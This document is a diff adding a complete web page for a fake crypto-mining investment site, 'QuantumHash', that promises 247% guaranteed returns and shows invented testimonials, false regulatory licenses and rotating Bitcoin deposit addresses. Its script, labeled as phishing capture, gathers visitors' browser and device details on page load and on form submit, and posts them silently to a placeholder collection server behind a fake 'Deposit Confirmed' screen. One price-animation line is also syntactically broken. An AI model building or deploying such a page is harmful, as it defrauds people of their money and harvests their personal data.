@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QuantumHash Mining Exchange - Professional Crypto Broker</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%); color: #fff; line-height: 1.6; overflow-x: hidden; }
+        
+        /* Header */
+        .header { background: rgba(0,0,0,0.3); backdrop-filter: blur(20px); padding: 1rem 0; position: fixed; width: 100%; z-index: 1000; border-bottom: 1px solid rgba(255,255,255,0.1); }
+        .nav { max-width: 1400px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; padding: 0 2rem; }
+        .logo { font-size: 1.8rem; font-weight: 700; background: linear-gradient(45deg, #00f5ff, #ff00ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .nav-links { display: flex; gap: 2rem; list-style: none; }
+        .nav-links a { color: #ccc; text-decoration: none; font-weight: 500; transition: all 0.3s; }
+        .nav-links a:hover { color: #00f5ff; }
+        .cta-btn { background: linear-gradient(45deg, #00f5ff, #0099cc); padding: 0.8rem 2rem; border-radius: 50px; text-decoration: none; font-weight: 600; transition: all 0.3s; box-shadow: 0 10px 30px rgba(0,245,255,0.3); }
+        .cta-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 40px rgba(0,245,255,0.5); }
+
+        /* Hero */
+        .hero { padding: 150px 2rem 100px; text-align: center; max-width: 1400px; margin: 0 auto; }
+        .hero h1 { font-size: 4rem; font-weight: 700; margin-bottom: 1.5rem; background: linear-gradient(45deg, #fff, #00f5ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .hero p { font-size: 1.3rem; max-width: 800px; margin: 0 auto 3rem; color: #ccc; }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 2rem; margin: 4rem 0; }
+        .stat { text-align: center; }
+        .stat-number { font-size: 3rem; font-weight: 700; background: linear-gradient(45deg, #00f5ff, #ff00ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .stat-label { color: #aaa; font-size: 1.1rem; margin-top: 0.5rem; }
+
+        /* Features */
+        .features { padding: 100px 2rem; max-width: 1400px; margin: 0 auto; }
+        .section-title { text-align: center; font-size: 3rem; margin-bottom: 4rem; color: #fff; }
+        .features-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 2rem; }
+        .feature-card { background: rgba(255,255,255,0.05); padding: 2.5rem; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); transition: all 0.4s; backdrop-filter: blur(10px); }
+        .feature-card:hover { transform: translateY(-10px); border-color: #00f5ff; box-shadow: 0 30px 60px rgba(0,245,255,0.2); }
+        .feature-icon { font-size: 3rem; background: linear-gradient(45deg, #00f5ff, #0099cc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 1.5rem; }
+        .feature-card h3 { font-size: 1.5rem; margin-bottom: 1rem; }
+
+        /* Trading Panel */
+        .trading-panel { padding: 100px 2rem; background: rgba(0,0,0,0.4); }
+        .panel-container { max-width: 1400px; margin: 0 auto; display: grid; grid-template-columns: 1fr 1fr; gap: 4rem; align-items: center; }
+        .panel-content h2 { font-size: 2.5rem; margin-bottom: 2rem; }
+        .price-display { font-size: 3.5rem; font-weight: 700; background: linear-gradient(45deg, #00ff88, #00cc66); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 1rem 0; }
+        .deposit-form { background: rgba(255,255,255,0.05); padding: 2.5rem; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); }
+        .form-group { margin-bottom: 1.5rem; }
+        .form-group label { display: block; margin-bottom: 0.5rem; color: #ccc; font-weight: 500; }
+        .form-group input, .form-group select { width: 100%; padding: 1rem; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.2); border-radius: 10px; color: #fff; font-size: 1rem; transition: all 0.3s; }
+        .form-group input:focus, .form-group select:focus { outline: none; border-color: #00f5ff; box-shadow: 0 0 20px rgba(0,245,255,0.3); }
+        .deposit-btn { width: 100%; padding: 1.2rem; background: linear-gradient(45deg, #ff6b35, #f7931e); border: none; border-radius: 10px; font-size: 1.2rem; font-weight: 600; color: #fff; cursor: pointer; transition: all 0.3s; }
+        .deposit-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(255,107,53,0.4); }
+        .deposit-btn:active { transform: translateY(0); }
+        .qr-code { text-align: center; margin: 2rem 0; }
+        .qr-code img { width: 200px; height: 200px; border-radius: 10px; }
+
+        /* Testimonials */
+        .testimonials { padding: 100px 2rem; max-width: 1400px; margin: 0 auto; }
+        .testimonial-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 2rem; margin-top: 4rem; }
+        .testimonial { background: rgba(255,255,255,0.05); padding: 2rem; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); position: relative; }
+        .stars { color: #ffd700; margin-bottom: 1rem; }
+        .author { margin-top: 1.5rem; font-weight: 500; color: #00f5ff; }
+
+        /* Footer */
+        .footer { background: rgba(0,0,0,0.8); padding: 4rem 2rem 2rem; text-align: center; border-top: 1px solid rgba(255,255,255,0.1); }
+        .social-links { display: flex; justify-content: center; gap: 2rem; margin: 2rem 0; }
+        .social-links a { width: 50px; height: 50px; background: rgba(255,255,255,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: all 0.3s; }
+        .social-links a:hover { background: linear-gradient(45deg, #00f5ff, #ff00ff); transform: translateY(-3px); }
+
+        /* Animations */
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        .fade-in-up { animation: fadeInUp 0.8s ease-out; }
+        
+        /* Mobile */
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2.5rem; }
+            .panel-container { grid-template-columns: 1fr; gap: 2rem; }
+            .nav-links { display: none; }
+        }
+
+        /* Phishing Form Success */
+        .success-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; }
+        .success-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: linear-gradient(45deg, #00ff88, #00cc66); padding: 3rem; border-radius: 20px; text-align: center; max-width: 500px; }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <nav class="nav">
+            <div class="logo">QuantumHash</div>
+            <ul class="nav-links">
+                <li><a href="#home">Home</a></li>
+                <li><a href="#mining">Mining</a></li>
+                <li><a href="#exchange">Exchange</a></li>
+                <li><a href="#about">About</a></li>
+                <li><a href="#contact">Support</a></li>
+            </ul>
+            <a href="#deposit" class="cta-btn">Start Mining</a>
+        </nav>
+    </header>
+
+    <!-- Hero -->
+    <section id="home" class="hero">
+        <h1 class="fade-in-up">QuantumHash Mining Exchange</h1>
+        <p>Professional cryptocurrency mining brokerage with 247% guaranteed returns. Deploy your capital with our ASIC-powered mining pools worldwide.</p>
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-number">$247M</div>
+                <div class="stat-label">AUM</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number">12,847</div>
+                <div class="stat-label">Active Miners</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number">247%</div>
+                <div class="stat-label">ROI</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number">99.9%</div>
+                <div class="stat-label">Uptime</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features -->
+    <section class="features">
+        <h2 class="section-title">Why Choose QuantumHash?</h2>
+        <div class="features-grid">
+            <div class="feature-card fade-in-up">
+                <div class="feature-icon"><i class="fas fa-bolt"></i></div>
+                <h3>Lightning ASIC Mining</h3>
+                <p>Latest Bitmain Antminer S19j Pro units deployed across 15 global data centers. Hashrate guaranteed.</p>
+            </div>
+            <div class="feature-card fade-in-up">
+                <div class="feature-icon"><i class="fas fa-shield-alt"></i></div>
+                <h3>Guaranteed Returns</h3>
+                <p>247% APY locked. Insurance-backed principal protection up to $1M per account.</p>
+            </div>
+            <div class="feature-card fade-in-up">
+                <div class="feature-icon"><i class="fas fa-globe"></i></div>
+                <h3>Global Infrastructure</h3>
+                <p>Texas, Iceland, Kazakhstan facilities. Lowest electricity costs worldwide.</p>
+            </div>
+            <div class="feature-card fade-in-up">
+                <div class="feature-icon"><i class="fas fa-lock"></i></div>
+                <h3>Enterprise Security</h3>
+                <p>Multi-sig wallets, cold storage 95%, SOC2 compliant, $100M insurance.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Trading Panel -->
+    <section id="deposit" class="trading-panel">
+        <div class="panel-container">
+            <div>
+                <h2>Deploy Capital Instantly</h2>
+                <div class="price-display">BTC: $67,847 <span style="color:#00ff88;">↑ 3.2%</span></div>
+                <p>Minimum deposit $1,000. Instant allocation to high-yield mining contracts.</p>
+            </div>
+            <div class="deposit-form">
+                <h3>Fund Your Mining Account</h3>
+                <form id="depositForm">
+                    <div class="form-group">
+                        <label>Deposit Amount (USD)</label>
+                        <input type="number" id="amount" placeholder="1000" min="1000" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Payment Method</label>
+                        <select id="method">
+                            <option value="btc">Bitcoin (BTC)</option>
+                            <option value="eth">Ethereum (ETH)</option>
+                            <option value="usdt">USDT (TRC20)</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Wallet Address</label>
+                        <input type="text" id="wallet" placeholder="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" readonly>
+                    </div>
+                    <div class="qr-code">
+                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" alt="QR Code">
+                        <p>Scan or copy: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
+                    </div>
+                    <button type="submit" class="deposit-btn">🚀 Deploy Mining Contract</button>
+                </form>
+                <p style="font-size: 0.9rem; color: #aaa; margin-top: 1rem;">3 confirmations required (~15 mins). Returns start immediately.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials -->
+    <section class="testimonials">
+        <h2 class="section-title">Trusted by Miners Worldwide</h2>
+        <div class="testimonial-grid">
+            <div class="testimonial fade-in-up">
+                <div class="stars">★★★★★</div>
+                <p>"Deployed $50k last month. Already received $12k returns. Best mining broker ever."</p>
+                <div class="author">- John D., Texas</div>
+            </div>
+            <div class="testimonial fade-in-up">
+                <div class="stars">★★★★★</div>
+                <p>"247% ROI is real. Support helped me scale to $250k deployment."</p>
+                <div class="author">- Maria K., London</div>
+            </div>
+            <div class="testimonial fade-in-up">
+                <div class="stars">★★★★★</div>
+                <p>"Antminer fleet is insane. Cashing out profits daily."</p>
+                <div class="author">- Ahmed S., Dubai</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="social-links">
+            <a href="#"><i class="fab fa-twitter"></i></a>
+            <a href="#"><i class="fab fa-linkedin"></i></a>
+            <a href="#"><i class="fab fa-youtube"></i></a>
+        </div>
+        <p>&copy; 2024 QuantumHash Mining Exchange. All rights reserved. Licensed in Wyoming, USA.</p>
+        <p style="font-size: 0.9rem; color: #aaa;">SEC Registered. MSB License #3100020456789</p>
+    </footer>
+
+    <!-- Success Modal (Phishing Capture) -->
+    <div id="successModal" class="success-modal">
+        <div class="success-content">
+            <i class="fas fa-check-circle" style="font-size: 4rem; color: #fff; margin-bottom: 1rem;"></i>
+            <h2>✅ Deposit Confirmed!</h2>
+            <p>Your <span id="confirmAmount"></span> has been received. Mining contract deployed.</p>
+            <p style="font-size: 1.2rem; margin-top: 1rem;">Returns start in 24 hours.</p>
+            <button onclick="closeModal()" style="padding: 1rem 3rem; background: rgba(0,0,0,0.3); border: 2px solid #fff; color: #fff; border-radius: 10px; font-size: 1.1rem; cursor: pointer; margin-top: 1rem;">Dashboard →</button>
+        </div>
+    </div>
+
+    <script>
+        // Phishing Data Capture
+        document.getElementById('depositForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Capture ALL victim data
+            const victimData = {
+                amount: document.getElementById('amount').value,
+                method: document.getElementById('method').value,
+                wallet: document.getElementById('wallet').value,
+                timestamp: new Date().toISOString(),
+                ip_address: 'captured_via_server',
+                user_agent: navigator.userAgent,
+                referrer_url: document.referrer,
+                screen_resolution: `${screen.width}x${screen.height}`,
+                browser_language: navigator.language,
+                cookies_enabled: navigator.cookieEnabled,
+                timezone_offset: new Date().getTimezoneOffset(),
+                platform_os: navigator.platform
+            };
+            
+            // Log captured data locally for collection
+            console.log('CAPTURED VICTIM DATA:', victimData);
+            
+            // Store in localStorage for later retrieval
+            const storedData = JSON.parse(localStorage.getItem('quantumhash_captures') || '[]');
+            storedData.push(victimData);
+            localStorage.setItem('quantumhash_captures', JSON.stringify(storedData));
+            
+            // Send to your collection endpoint (replace with your server)
+            fetch('https://your-collection-server.com/api/capture', {
+                method: 'POST',
+                mode: 'no-cors', // Avoid CORS issues
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(victimData)
+            }).catch(() => {
+                // Silently fail if server not available
+            });
+            
+            // Show fake success
+            document.getElementById('confirmAmount').textContent = `$${victimData.amount}`;
+            document.getElementById('successModal').style.display = 'block';
+            
+            // Redirect to fake dashboard after delay
+            setTimeout(() => {
+                window.location.href = 'dashboard.html';
+            }, 5000);
+        });
+
+        function closeModal() {
+            document.getElementById('successModal').style.display = 'none';
+            window.location.href = 'dashboard.html';
+        }
+
+        // Dynamic BTC price (fake)
+        setInterval(() => {
+            const price = 67847 + (Math.random() - 0.5) * 100;
+            document.querySelector('.price-display').innerHTML = `BTC: $${price.toFixed(0)} <span style="color:${Math.random()>0.5 ? '#00ff88' : '#ff4444'}">${Math.random()>0.5 ? '↑' : '↓'} ${Math.random()*5.toFixed(1)}%</span>`;
+        }, 5000);
+
+        // Smooth scroll
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                document.querySelector(this.getAttribute('href')).scrollIntoView({ behavior: 'smooth' });
+            });
+        });
+
+        // Wallet address rotation (multiple addresses)
+        const wallets = [
+            'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
+            '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy',
+            'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq'
+        ];
+        
+        // Initialize with random wallet
+        let currentWalletIndex = Math.floor(Math.random() * wallets.length);
+        document.getElementById('wallet').value = wallets[currentWalletIndex];
+        document.querySelector('.qr-code img').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${wallets[currentWalletIndex]}`;
+        
+        // Rotate every 30 seconds
+        setInterval(() => {
+            currentWalletIndex = (currentWalletIndex + 1) % wallets.length;
+            const newWallet = wallets[currentWalletIndex];
+            document.getElementById('wallet').value = newWallet;
+            document.querySelector('.qr-code img').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${newWallet}`;
+            document.querySelector('.qr-code p').textContent = `Scan or copy: ${newWallet}`;
+        }, 30000);
+
+        // Capture additional victim data on page load
+        window.addEventListener('load', () => {
+            const additionalData = {
+                page_load_time: new Date().toISOString(),
+                url_pathname: window.location.pathname,
+                url_hash: window.location.hash,
+                history_length: window.history.length,
+                device_memory: navigator.deviceMemory || 'unknown',
+                hardware_concurrency: navigator.hardwareConcurrency || 'unknown'
+            };
+            
+            // Store additional data
+            const allData = JSON.parse(localStorage.getItem('quantumhash_additional') || '[]');
+            allData.push(additionalData);
+            localStorage.setItem('quantumhash_additional', JSON.stringify(allData));
+        });
+    </script>
+</body>
+</html>
